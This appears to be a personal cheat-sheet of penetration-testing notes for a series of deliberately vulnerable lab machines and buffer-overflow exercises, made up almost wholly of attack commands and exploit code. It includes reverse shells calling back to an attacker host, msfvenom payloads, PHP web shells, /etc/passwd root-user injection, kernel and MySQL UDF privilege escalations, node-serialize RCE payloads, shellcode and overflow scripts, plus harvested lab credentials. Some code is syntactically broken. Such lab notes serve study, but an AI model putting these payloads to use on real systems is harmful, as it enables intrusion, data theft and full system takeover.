msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.1.1.5 LPORT=4141 -f war -o exp.war
		##login and upload
http://10.1..1.69/exp
nc -lvp 4141
>whoami
>ls -lah /home
>su fluffy
password: freakishfluffybunny
>cd /home/fluffy/.private/secret
>cat timelock
http://10.1.1.69/time
>nano timelock
		echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd
http://10.1.1.69/time
>su rooot
		##exploit kernel dirtycow
>uname -a
>uname -m
>lsb_release -a
>wget 10.1.1.5/dirtycow
>chmod 775 dirtycow
>echo 0 > /proc/sys/vm/dirty_writeback_centisecs
>back_centisecs
>id
>apt-get update
>apt-get install build-essential
>which gcc
apt-get install gcc-multilib g++-multilib
		##got error broken package
apt-get install aptitude
aptitude install gcc-multilib
		##dirtycow exploit linux kernel CVE-2016-5195
>uname -a
>uname -m
>lsb_release -a
git clone https://github.com/FireFart/dirtycow
gcc -pthread dirty.c -o dcow -lcrypt -static
>wget 10.1.1.5/dcow
>chmod +x dcow
>./dcow
>Password: asd
>su firefart
>echo 0 > /proc/sys/vm/dirty_writeback_centisecs
>id





Joy
===================================
python3 autorecon.py 10.1.1.71
ftp 10.1.1.71
>anonymous
>cd upload
		##directory writeable
>put autorecon.py
wget -m ftp://anonymous:anonymous@10.1.1.71
cat directory
		##abuse ftp lfi ftp local file inclusion
telnet 10.1.1.71 21
>site cpfr /home/patrick/version_control
>site cpto /home/ftp/upload/version_control
ftp://10.1.1.71/upload/version_control
searchsploit proftpd 1.3.5
msfconsole
>search proftpd
>use exploit/unix/ftp/proftpd_modcopy_exec
>set rhost 10.1.1.71
>set sitepath /var/www/tryingharderisjoy
>set rport 80
>set rport_ftp 21
>show payloads
>set paylods
>run
>id
>python -c 'import pty; pty.spawn("/bin/sh")'
>which python
		##python reverse shell
>export RHOST="10.1.1.71";export RPORT=4141;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4141
>cd ossec
>cat patricksecretsofjoy
		##got credz patrick:apollo098765
>su patrick
>which socat
		##socat transfer file
nc -lvp 5555 < linpeas.sh
>socat -u TCP:10.1.1.5:5555 STDOUT > linpeas.sh
>bash linpeas.sh
>sudo -l
>sudo /home/patrick/script/test
		##change ../../../../etc/passwd to 777
>ls -lah /etc/passwd
>cp /etc/passwd passwd.bak
>cp newpasswd /etc/passwd
>su rooot
		##ftp can copy as root
telnet 10.1.1.71 21
>site cpfr /home/patrick/script/test
>site cpto /home/ftp/upload/test
echo "/bin/sh" > test
>site cpfr /home/ftp/upload/test
>site cpto /home/patrick/script/test
sudo /home/patrick/script/test
>site cpfr /home/ftp/upload/passwd.bak
>site cpto /etc/passwd
su rooot
		##another vector port tftp open
cat udp_161_snmpwalk.txt
		STRING: "— listen — user tftp — address 0.0.0.0:36969 — secure /home/patrick
tftp 10.1.1.71 36969
>get version_control
		##proftpd 1.3.5 github exploit
		##https://github.com/t0kx/exploit-CVE-2015-3306
python proftpd_exp.py --host 10.1.1.71 --port 21 --path "/var/www/tryingharderisjoy"
http://10.1.1.71/backdoor.php?cmd=id
http://10.1.1.71/backdoor.php?cmd=which python




NullByte
==================================
python3 autorecon.py 10.1.1.72
wget http://10.1.1.72/main.gif
exiftpol main.gif
		##got info kzMb5nVYJw
http://10.1.1.72/kzMb5nVYJw/
hydra -L /home/rockyou.txt -p elite 10.1.1.72 http-post-form "/kzMb5nVYJw/index.php:key=^USER^:invalid"
		##got key elite
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt --batch -D seth --tables
sqlmap -r req.txt --batch -D seth --dump
sqlmap -r req.txt --batch -D mysql --tables
sqlmap -r req.txt --batch -D mysql -T user -C User,Password --dump
		##got credz root:sunnyvale
http://10.1.1.72/phpmyadmin/
		##phpmyadmin shell
		##query: select "<?php system($_GET['c']);?>" into outfile "/var/www/html/uploads/shell.php"
http://10.1.1.72/uploads/shell.php?c=id
http://10.1.1.72/uploads/shell.php?c=which wget
http://10.1.1.72/uploads/shell.php?c=wget 10.1.1.5/cmd.php
http://10.1.1.72/uploads/cmd.php
		##python reverse shell
		##export RHOST="10.1.1.5";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvp 4242
>su ramses
password:omega
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
>cat /var/www/backup/readme.txt
>/var/www/backup/procwatch
		##using ps program and abuse PATH
>echo $PATH > path.bak.txt
>PATH=/var/www/backup/:$PATH
>nc 10.1.1.5 5555 > ps
nc -lvp 5555 < ps
		##python reverse shell
>/var/www/backup/procwatch
nc -lvp 4444
>>id
>>cd /root
>>cat proof.txt




GasGlow Smile
====================================
python3 autorecon.py 10.1.1.76
gobuster dir http://10.1.1.76 -w /usr/share/wordlist/../../..2.medium.txt
htp://10.1.1.76/joomla/administrator
joomscan -u http://10.1.1.76/joomla/
git clone https://github.com/D35m0nd142/Joomla-Components-Exploits-Auto-Updating-Scanner
python joomlascan.py --target http://10.1.1.7/joomla/
cewl -h					##error cewl ruby
ruby2.7 -W0 /usr/bin/cewl http://10.1.1.7/joomla/
	##bruteforce it with burp
	##got credz joomla:Gotham
	##login, change template, got reverse shell
>cat /var/www/html/joomla/configuration.php		##joomla configuration	
	##got mysql joomla:babyjoker
>mysql -u joomla -p
>use batjoke; select * from taskforce;
	##got credz rob:???AllIHaveAreNegativeThoughts???
ssh rob@10.1.1.76
>cat Abnerineedyourhelp
	##encode all rot type with this link
rot decode full https://tech.pookey.co.uk/non-wp/rot-decoder.php
	##got cred abner:I33hope99my0death000makes44more8cents00than0my0life0
>su abner
>cat .bash_history
>find / -name "*penguin*" 2>/dev/null
>unzip /var/www/joomla2/administrator/manifests/files/.dear_penguins.zip -d .
>su penguin scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
>wget 10.1.1.5/pspy
>chmod +x pspy
>./pspy
>chmod "nc -e bash 10.1.1.5 4242" >> SomeoneWhoHidesBehindAMask/.trash_old
nc -lvp 4242



Photographer
====================================
python3 autorecon.py 10.1.1.77
smbmap -H 10.1.1.77
smbclient //10.1.1.77/smbshare
>get mailsent.txt
cat mailsent.txt
		##got credz daisa@photographer.com:babygirl
http://10.1.1.77:8000/admin
		##exploit koken 
		##liblary > content > upload content
		##upload image and temper with burp to get reverse shell
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
		##php privesc setuid
>php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
>id
>cat /root/proof.txt



Healthcare
====================================
python3 autorecon.py 10.1.1.78
gobuster dir -u http://10.1.1.78 -w /usr/share/..../directory-list-2.3-big.txt
http://10.1.1.78/openemr/
		##login and observe the request on burp
http://10.1.1.78/openemr/interface/login/validateUser.php?u=admin
http://10.1.1.78/openemr/interface/login/validateUser.php?u=admin'
		##got sql error response
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt --batch --dbms=mysql -D openemr --tables
sqlmap -r req.txt --batch --dbms=mysql -D openemr -T user --dump
sqlmap -r req.txt --batch --dbms=mysql -D openemr -T user -C id,username,password
		##got credz admin:ackbar medical:medical
		##login
administrator > files > change statement.inc.php
http://10.1.1.78/openemr/sites/default/statement.inc.php
nc -lvp 4141
>su medical
>cd ~
>find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
>cp /usr/bin/healthcare .
>strings healthcare
		##call ifconfig
>echo $PATH
>PATH=~:$PATH
>echo $PATH
>echo "/usr/bin/nc -e /bin/bash 10.1.1.5 4141" > ifconfig
>chmod 777 ifconfig
>./ifconfig
>/usr/bin/healthcheck
nc -lvp 4141



Tiki
====================================
python3 autorecon.py 10.1.1.80
smbclient \\10.1.1.80\Notes
>get Mail.txt
cat Mail.txt
dirb http://10.1.1.80 /usr/share/wordlist/dirbuster/directory-list-2.0-big.txt
http://10.1.1.80/tiki/
		##got credz silky:51lky571k1
		##cve tiki login bypass
		##login 50 times, then login with null password
for i in $(seq 1 60); do echo $i; done
		##login with intruder
		##login again as admin intercept with burp remove password fill with nothing
http://10.1.1.80/tiki/tiki-index.php?page=Credentials
		##got credz silky:Agy8Y7SPJNXQzqA
ssh silky@10.1.1.80
>sudo -l
>sudo su
>id






Fristileaks
====================================
python3 autorecon.py 10.1.1.81
http://10.1.1.81/robots.txt
http://10.1.1.81/fristi
view-source:http://10.1.1.81/fristi
		##got base64file
echo "b64" > b64
base64 -f b64 > file
file file
display file
		##got credz eezeepz:keKkeKKeKKeKkEkkEk
http://10.1.1.81/fristi/upload.php
		##upload shell.php.jpg.php.jpg
http://10.1.1.81/fristi/uploads/shell.php
nc -lvp 4141
>cd /home/eezeepz
>cat notes.txt
>echo "/usr/bin/id; bash -i >& /dev/tcp/10.1.1.5/4242 0>&1" > /tmp/runthis
nc -lvp 4242
>id
>cd ~
>cat *.txt
		##string encoded base64, encode rot 13, reverse string
		##https://codebeautify.org/reverse-string
		##got credz admin:thisisalsopw123 fristigod:LetThereBeFristi!
>su fristigod
>cd ~
>sudo -l
		##(fristi : ALL) /var/fristigod/.secret_admin_stuff/doCom
>strings /var/fristigod/.secret_admin_stuff/doCom
>sudo /var/fristigod/.secret_admin_stuff/doCom
		##got error because different user fristi and fristigod
>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom
>sudo -u fristi /var/fristigod/.secret_admin_stuff/doCom /bin/bash
>id




Development digital.world
=================================
nmap -p- -sS --min-rate 10000 10.1.1.74
http://10.1.1.74/
http://10.1.1.74/html_pages
http://10.1.1.74/development.html
http://10.1.1.74/developmentsecretpage/
http://10.1.1.74/developmentsecretpage/patrick.php?logout=1
		##try login
		##got error /slogin_lib.inc.php
		##https://www.exploit-db.com/exploits/7444 Simple Text-File Login script (SiTeFiLo)
http://10.1.1.74/developmentsecretpage/slog_users.txt
		##got credz
		##intern:12345678900987654321
		##patrick:P@ssw0rd25
ssh patrick@10.1.1.74
		##got error ssh too many authentication failure
ssh patrick@10.1.1.74 -o IdentitiesOnly=yes
ssh patrick@10.1.1.74 -o PubkeyAuthentication=no
		##still got error
ssh intern@10.1.1.74
>?
		##rbash escape
>echo os.system("/bin/bash")
>su patrick
>sudo -l
>sudo /usr/bin/vim
>:set shell=/bin/sh
>:shell
>id





Lord Of The Root
=================================
./autorecon.py 10.1.1.82
ssh root@10.1.1.82
knock -v 10.1.1.82 1 2 3
nmap -p- --min-rate 10000 10.1.1.82
http://10.1.1.82:1337/
http://10.1.1.82:1337/blackgate
view-source:http://10.1.1.82:1337/
		##/978345210/index.php
http://10.1.1.82:1337//978345210/index.php
		##login sql cheat sheet susscess with payload  1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D Webapp --batch --dump
		##got credz smeagol:MyPreciousR00t
ssh smeagol@10.1.1.82
>id
>bash linpeas.sh
>cd /SECRET
>md5sum door1/file door2/file door3/file
		##buffer overflow shit I cant
		##https://pfarrside.com/write-ups/lord-of-the-root/
>cat /proc/sys/kernel/randomize_va_space
>gdb -q file
>checksec
>info functions
>r buffer
		##offsite 171
>r buffer+BBBB+NOP*200
		##address NOP on 0xbfd137fc
import struct
from pwn import *
buf = ""
buf += "A"*171
buf += struct.pack("<I", 0xbfd137fc)
buf += "\x90"*1000
buf += asm(shellcraft.i368.linux.sh())
print buf
python x.py > asd
>./file $(cat asd)
		##got Segmentation fault because ASLR
		##bypass ASLR
>for a in {1..1000}; do /SECRET/door2/file $(cat asd);done
#id

		##mysql udf raptor sys_exec privesc
>wget https://www.exploit-db.com/download/46249
>python 46249 --username root --password darkshadow
#id
>cat /etc/mysql/my.cnf
		##user 		= root
		##datadir 	= /var/lib/mysql/
>mysql -u root -p
>use mysql;
		##copy shell in 46246 which 32binary or 64binary
>select binary 0xpasteshell into dumpfile '/usr/lib/mysql/plugin/asd.so';
>create function sys_exec returns int soname 'asd.so';
>select * from mysql.func;
>select sys_exec('cp /bin/sh /tmp/asd; chown root:root /tmp/asd; chmod +s /tmp/asd')
>/tmp/asd
#id
		##mysql udf raptor do_system privesc
wget https://raw.githubusercontent.com/1N3/PrivEsc/master/mysql/raptor_udf2.c
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o asd.so raptor_udf2.o -lc
mysql -u root
>use mysql;
>create table asd(line blob);
>insert into asd values(load_file('/tmp/asd.so'));
>select * from asd into dumpfile '/usr/lib/mysql/plugin/asd.so';
>create function do_system returns integer soname 'asd.so';
>select * from mysql.func;
>select do_system("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash");
>/tmp/rootbash -p
#id
		##linux kernel ubuntu linux 3.19.0-42 exploit kernel privesc
>uname -a
		##linux LordOfTheRoot 3.19.0-25-generic 14.04 ubuntu
searchsploit linux 3.19
search google "exploit-db linux 3.19.0"
>wget https://www.exploit-db.com/download/39166
>mv 39166 39166.c
>gcc 39166
>./a.out
#id



Webdeveloper
==========================================
python3 autorecon.py 10.1.1.83
dirb http://10.1.1.83
http://10.1.1.83/ipdata
wget http://10.1.1.83/ipdata/analyze.cap
wireshark analyze.cap
		##got credz webdeveloper:passwd
wpscan --url http://10.1.1.83 -e u,vp,vt,cb,dbe
http://10.1.1.83/wp-admin
		##install plugin file manager and upload shell
nc -lvp 4141
		##find python to upgrade shell
>find / -name "*python*" -executable -type f 2>/dev/null
>/usr/bin/python3.6 -c 'import pty;pty.spawn("/bin/bash")'
>su webdeveloper
>sudo -l
		##(root)	/usr/sbin/tcpdump
		##tcpdump privesc
>echo $'id\ncat /etc/shadow' > /tmp/.test
>echo \
>cat /root/flag.txt >> /tmp/.test
>echo \
>php /var/www/html/wp-content/uploads/rev/php >> /tmp/.test
>chmod +x /tmp/.test
>sudo -u root tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
nc -lvp 4141
>id
		##lxd privesc
ssh webdeveloper@10.1.1.83
>id
find /home -name "alphine.tar.gz" 2>/dev/null
python -m SimpleHTTPServer 80
>wget http;//10.1.1.5/alphine.tar.gz . 
>which lxd
>which lxc
>lxc image import alphine.tar.gz --alias myimage
>lxc init myimage ignite -c security.privileged=true
		##got error & need to init lxd
>lxd init
		##enter to the end
>lxc init myimage ignite -c security.privileged=true
>lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
>lxc start ignite
>lxc exec ignite /bin/sh
>id
>cd /mnt/root/root
>ls
>cat flag.txt
>cat /mnt/root/etc/sudoers
>echo "%webdeveloper ALL=(ALL:ALL) ALL" >> /mnt/root/etc/sudoers
ssh webdeveloper@10.1.1.83
>sudo -l
>sudo /bin/bash



Zico 2
====================================
python3 autorecon.py 10.1.1.84
dirb http://10.1.1.84
http://10.1.1.84/view.php?page=tools.html
http://10.1.1.84/view.php?page=../../../../../etc/passwd
		##found LFI
http://10.1.1.84/dbadmin/test_db.php
		##login with default password admin:admin
		##create table with php rce
http://10.1.1.84/view.php?page=../../../../usr/databases/test
nc -lvp 4141
>id
>cd /home/zico
>cat wordpress/wp-config.php
		##got credz zico:sWknoQKJbhsIIQbsjbqs
su zico@10.1.1.84
>sudo -l
		##zip privesc
>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
		##find privesc SUID
>find /tmp -exec /bin/sh -i \;
		##kernel privesc
>uname -a
>Linux Zico 3.2.0-23-generic #36-Ubuntu x86_64 GNU/Linux
searchsploit linux 3.2.0-23
searhsploit -m 33589
>gcc vnik.c -O2 -o vnik
>./vnik
>id




Temple Of Doom
======================================
python3 autorecon.py 10.1.1.85
dirb http://10.1.1.85:666
http://10.1.1.85:666
http://10.1.1.85:666
		##got error node-serialize/lib/serialize.js
		##got user /home/nodeadmin
set cookie to {"username":"Admin","csrftoken":"u32t4o3tb3gg431fs34ggdgchjwnza0l=","Expires=":"Friday, 13 Oct 2018 00:00:00 GMT"}
		##then got success message
		##exploit node serialize node-serialize nodejs rce
set cookie to {"username":"Admin"} encode with base64 and still got success message
payload= {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('ls -l /',(e,out,err)=>{console.log(out);}); }()"}
rev payload= {"username":"_$$ND_FUNC$$_function(){return require('child_process').execSync('bash -i >& /dev/tcp/10.1.1.5/4141 0>&1',(e,out,err)=>{console.log(out);}); }()"}
>id
>bash linpeas.sh
>ps -aux | grep fireman
		##/usr/bin/ss-manager
		##exploit shadowshock ss-manager
		##https://www.exploit-db.com/exploits/43006
>netstat -lntpu
		##udp	127.0.0.1:8839
		##everytime found udp 8839 might be shadowshock service
>nc -u 127.0.0.1 8839
>add: {"server_port":8003, "password":"test", "method":"||touch /tmp/evil||"}
>ls -la /tmp
		##evil file created as fireman
>nc -u 127.0.0.1 8839
>add: {"server_port":8003, "password":"test", "method":"||bash -i >& /dev/tcp/10.1.1.5/5252 0>&1||"}
nc -lvp 5252
>id
>bash linpeas.sh
>sudo -l
		##(ALL) NOPASSWD: /usr/sbin/tcpdump
		##tcpdump privesc
>echo "nc 10.1.1.5 5151 -e /bin/sh" > /tmp/rev
>chmod +x /tmp/rev
>sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/rev -Z root
nc -lvp 5151
>id
>cat /root/flag.txt





Immirtil exploit gd-image
========================================
gd-jpeg v1.0 (using IJG JPEG v62), quality = 90
		##exploit imagecreatefromjpeg()
https://asdqw3.medium.com/remote-image-upload-leads-to-rce-inject-malicious-code-to-php-gd-image-90e1e8b2aada
	#create none image to gd-image format
php gd.php image.jpg image-gd.php		#https://gist.githubusercontent.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b/raw/82acda6b4f1e9c1ab8a6012e5469368fb351b985/gd.php
	#inject payload to image
python gd-jpeg.py image-gd.php '<?php phpinfo()?>' image-gd-poc.jpg		#https://github.com/dlegs/php-jpeg-injector
	#try recreate gd-image
php gd.php image-gd-poc.jpg upload.jpg 90
nano upload.jpg
hexeditor upload.jpg
	#the problem is image compressed with quality 90
	#try with gd-gif, same method create gd-gif format
	#exploit imagecreatefromgif()
php gd-gif.php image.gif gd-image.gif	#https://gist.githubusercontent.com/asdqwe3124/e63eba35dc8e6976af97f1a9348b277b/raw/82acda6b4f1e9c1ab8a6012e5469368fb351b985/gd-gif.py
	#inject payload
gd-gif.py gd-image.gif '<?php phpinfo()?>' gif-gd-poc.gif
	#recreate gif
php gd-gif.php gif-gd-poc.gif upload.gif
nano upload.gif
hexeditor upload.gif
	#upload, download and validate
curl https://web/upload/upload.gif
	#upload, intercept with burp, change extention to php
		##exploit imagecopyresampled() and imagecopyresized()
https://blog.safebuff.com/2016/06/17/Bypass-imagecopyresampled-and-imagecopyresized-generate-PHP-Webshell/
php jpg_payload.php image.jpg
nano payload_image.jpg
hexeditor payload_image.jpg
	#validate
php gd.php payload_image.jpg upload.jpg
nano upload.jpg
	#upload, intercept with burp, change extention to php, and download





Into Stack overflow
====================================
login level0:level0
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
git clone https://github.com/Gallopsled/pwntools
pip install --upgrade --editable ./pwntools
gdb -q ./levelOne
>pdisass main
		##break at cmp instruction
>b *main+134
>r AAAAAAAAAAAAAAAAAAAAAACCCC
>x/s $ebp-0x20
		##got value CCCC
--------------
su level2
gdb -q ./levelTwo
>info functions
>pdisass spawn
		##spawn function at 0x565561e9
./levelTwo $(python -c 'print "A"*36+"\xe9\x61\x55\x56")
--------------
su level3
gdb -q ./levelThree
>checksec
>b *overflow+72
>r AAAAAAAAAAAABBB
		##offsite 28
>x/ws 0xffffd260		##staarting buffer
/.levelThree $(python -c 'print buff+'\x60\xd2\xff\xff'+'\x90'*100+shell)
		##root setuid 0 shell
"\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
--------------
su level4
		## ret to libc rettolibcf
gdb -q levelFive
>b *overflow+72
>r AAAAAAAAAAAAAAAABBB
>c
		##offsite 16
>p system
>searchmem /bin/sh
(python -c 'print buf+system+AAAA+bash_addr; cat) | ./levelFive
--------------
level4 exploit

import struct
from pwn import *

rshell="\x31\xdb\x8d\x43\x17\x99\xcd\x80\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x8d\x41\x0b\x89\xe3\xcd\x80"
buf = ""
buf += "A"*16
buf += struct.pack('<I', 0xffffd370)	#address NOP
buf += "\x90"*200
#buf += rshell
buf += asm(shellcraft.i386.linux.setreuid())
buf += asm(shellcraft.i386.linux.sh())

p = process("./levelFive")
p.sendline(buf)
p.interactive()





Assembly course
====================================
gdb ./Simpledemo
>list 1				##see the code
>run asd
>dissasamble main	##see gets() call and puts() call
>break 8			##break to add function
>run 10 20
>info registers
>x/10xb 0xbffff450	##print stack bytes
>x/10xw 0xbffff450	##print stack words
>s					##stepping next list line
>c 					##continue to the end

https://www.youtube.com/watch?v=RvvRO_gWYIg
http://www.securitytube.net/groups?operation=view&groupId=5





Buffer Overflow The Cyber Mentor
====================================
download vulnserver
disable realtiime virus protection and defender firewall
run as administrator
attach on imunity dibugger
choose open on immunity debugger, restart by (ctrl +F2) and (F9) to start
		##fuzzing
which generic_send_tcp
generic_send_tcp 10.1.1.87 9999 trun.spk 0 0
s_readline();
s_string("TRUN ");
s_string_variable("FUZZ");
	##TRUN is vulnerable
python fuzz.py
#!/usr/bin/python
import sys, socket
from time import sleep
buffer = 'A'+100
wile True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect(('10.1.1.87',9999))
		s.send(('TRUN /.:/'+buffer))
		s.close()
		sleep(1)
		buffer = buffer+'A'*100
	exept:
		print "Fuzzring crash at %s bytes" % str(len(buffer))
		sys.exit()
		##find offset
		##try overide EIP with BBBB
		##find bad characters
google bachars
copy and send it after EIP
s.send(('TRUN /.:/'+buffer+badchar))
in immunity debugger right click ESP -> follow in dump
bad characters can be identified as strange hex that are not it order with bad chars variable
screenshot hex in immunity debugger and zoom
		##find right module
download mona module
save it in C:\Program/ \File/ \(x86)\Immunity/ \Inc\Immunity /Debugger\PyCommand\mona.py
!mona modules
	find dll application (essfunc.dll)
JMP ESP (as pointer) is FFE4
!mona find -s "\xff\xe4" -m essfunc.dll
!mona jmp -r ESP -m "essfunc.dll"
	results: 0x625011af
click blue arrow (expression to follow) -> find "625011af" -> press F2 (set breakpoint)
buf = "A"*2003+ struct.pack("<I", 0x625011af)
		##write shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.5 LPORT=4242 EXITFUNC=thread -f c -a x86 -b "\x00"
buf = "A"*2003 + ret + "\x90"*32 + shell
nc -lvp 424259.125
>whoami
		##exercise
generic_send_tcp 10.1.1.87 9999 trun.spk 0 0
python fuzz.py
crash at 2300 and 3000 still crash
offset at 2003
esp can be flooded
!mona jmp -r ESP
JMP ESP 0x62501205 (ASCII available and security off)
msfvenom -p windows/shell_bind_tcp LPORT=4242 EXITFUNC=thread -f c -a x86 -b "\x00"
buff=offset+eip+nop+shell+'C'*(len(buffer)-len(shell)-len(nop)-len(eip))
nc 10.1.1.87 4242









dostackbufferoverflowgood
===================================
##fuzzing
import sys,socket,time
buf = 'A'*10
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.192.80", 31337))
        s.send(buf)
		s.recv(4098)
        s.close()
		print "Se d buf size of %s bytes" % str(len(buf))
		time.sleep(2)
		buf=buf+'A'*10
	except:
		print "\nCrash at %s bytes" % str(len(buf))
		sys.exit()
##exploit (use jmp esp)
buf = 'A'*146
eip = struct.pack("<I",0x080416bf)
nop="\x90"
msfvenom -p windows/exec cmd=calc.exe -b '\x00\x0a' exitfunc=thread -f c
shell=("") #msfvenom -p windows/shell_reverse_tcp lhost=10.10.249.18 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
buffer=buf+eip+nop+shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.192.80", 31337))
s.send(buf)
s.recv(4098)
s.close()



tryhackme oscp.exe buffer overflow
======================================
##badchar generator
for x in range (1,256):
	print ("\\x"+"{:02x}".format(x),end='')
print()
python3 badchargen.py
import socket
ip = '10.10.150.224'
port = 1337
prefix = 'OVERFLOW1 '
overflow = 'A'*offset
offset = 1978
retn = BBBB
badchar = ()
buffer = prefix + overflow + retn + badchar
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
s.send(bytes(buffer + "\r\n","latin-1"))
python3 badchar.py
!mona bytearray -b "\x00"
!mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 01A4FA30 ##esp address
	##got result badchar "\x00\x07\x08\x2e\x2f\xa0\xa1"
	##byte \x00 and \xa0 mostly known as bad char for machine code (\x00 end of string)(\xa0 jump instructuion idk i cant remember)
	##cause next byte might be currupted so we can assume that actual badchars is "\x00\x07\x2e\xa0"
!mona bytearray -b "\x00\x07\x2e\xa0"
	##remove badchar in badchar.py as well
python3 badchar.py
!mona compare -f bytearraybin -a 0192fa30
	#got another badchar \x01
!mona bytearray -b "\x00\x01\x07\x2e\xa0"
python3 badchar.py
!mona compare -f bytearraybin -a 0192fa30
	##no arror
msfvenom -p windows/exec cmd=calc.exe -b '\x00\x01\x07\x2e\xa0' exitfunc=thread -f c
!mona jmp -r esp -cpb "\x00\x01\x07\x2e\xa0"
buffer = prefix+overflow+retn+nop+payload+padding





tryhackme SLMail Buffer Overflow
====================================
net start slmail
	##fuzzing
import sys,socket,time
buf = 'A'*10
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("10.10.207.164", 110))
        s.send("USER asd\r\n")
		s.recv(4098)
		s.send("PASS "+buf+"\r\n")
        s.close()
		print "Se d buf size of %s bytes" % str(len(buf))
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		elif len(buf)<10000:
			buf=buf+'A'*1000
		elif len(buf)<100000
			buf=buf+'A'*10000
		else:
			print "buf over 100000 bytes"
			buf=buf+'A'*100000
	except:
		print "\nCrash at %s bytes" % str(len(buf))
		sys.exit()
	##offset
2606
	#badchar
!mona bytearray -b "\x00"
!mona compare -f bytearray.bin -a 0192fa30
\x00\x0a\x0d
	##find right module
!mona modules
SLMFC.DLL
!mona find -s "\xff\xe4" -m SLMFC.DLL -cpb "\x00\x0a\x0d"
0x5f4b5663
	##find and write exploit
set processor
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a\x0d' exitfunc=thread -e x86
msfvenom -p windows/shell_reverse_tcp lhost=10.10.249.18 lport=4242 -b '\x00\x0a\x0d' exitfunc=thread -f c -e x86/shikata_ga_nai
import sys,socket,struct
buf='A'*2606
eip=struct.pack("<I",0x5f4a358f)
nop='\x90'*8
shell=("")
buffer=buf=eip=nop+shell
s.socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.74.197",110))
s.recv(4098)
s.send("USER asd\r\n")
s.recv(4098)
s.send("PASS "+buffer+"\r\n")
s.close()
print "done"

tasklist -v | findstr /I /C "calc"
 




Brainstorm Tryhackme
===================================
nmap -p- -Pn -Ss 10.10.157.29 -o nmap
ftp 10.10.157.29 21
>dir
>cd chatserver
>binary				#dont fcking forget to change to binary transfer mode
>get chatserver.exe
>get essfunc.dll
	## file windows
powershell
$client = new-object System.Net.WebClient
$client.DownloadFile("http://10.1.1.88/chatserver.exe","C:\Users\admin\chatserver.exe")
$client.DownloadFile("http://10.1.1.88/essfunc.dll","C:\Users\admin\essfunc.dll")
	##fuzzing
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((""10.1.1.87",9999))
		s.recv(4098)
		s.send(str(len(buf))+"0")
		s.recv(4098)
		s.send(buf)
		s.close()
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		else
			buf=buf+'A'*1000
		print "sned %s bytes" % (len(buf))
	except:
		print "gagal"
		sys.exit()
	##offset 
2012
	#badchar
!mona bytearray -b "\x00"
!mona compare -f bytearraybin -a 0192fa30
\x00\
	##find right module
!mona modules
!mona find -s "\xff\xe4" -m essfunc.dll -cpb "\x00\x0a"
0x62501535
	##find and write exploit
set processor
msfvenom -p windows/exec cmd=calc.exe -f c -b '\x00\x0a' exitfunc=thread
msfvenom -p windows/shell_reverse_tcp lhost=10.1.1.88 lport=4242 -b '\x00\x0a' exitfunc=thread -f c
nc -lvp 4242
>cd ..\..\
>cd ..\Users\drake\Desktop
>type root.txt






Brainpan 1 tryhackme
====================================
nmap -p- -Pn 10.10.1.126
dirb http://10.10.1.126:10000
http://10.10.1.126:10000/bin
http://10.10.1.126:10000/bin/brainpan.exe
nc 10.10.1.126 9999
	#exploit buffer overflow to my windows machine
	##fuzzing
while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.connect((""10.1.1.87",9999))
		s.recv(4098)
		s.send(buf)
		s.recv(4098)
		s.send(buf)
		s.close()
		time.sleep(2)
		if len(buf)<100:
			buf=buf+'A'*10
		elif len(buf)<1000:
			buf=buf+'A'*100
		else
			buf=buf+'A'*1000
		print "send %s bytes" % (len(buf))
	except:
		print "gagal"
		sys.exit()
	##ofset
msf-pattern_create -l 1000
msf-pattern_offset -q  35724134
524
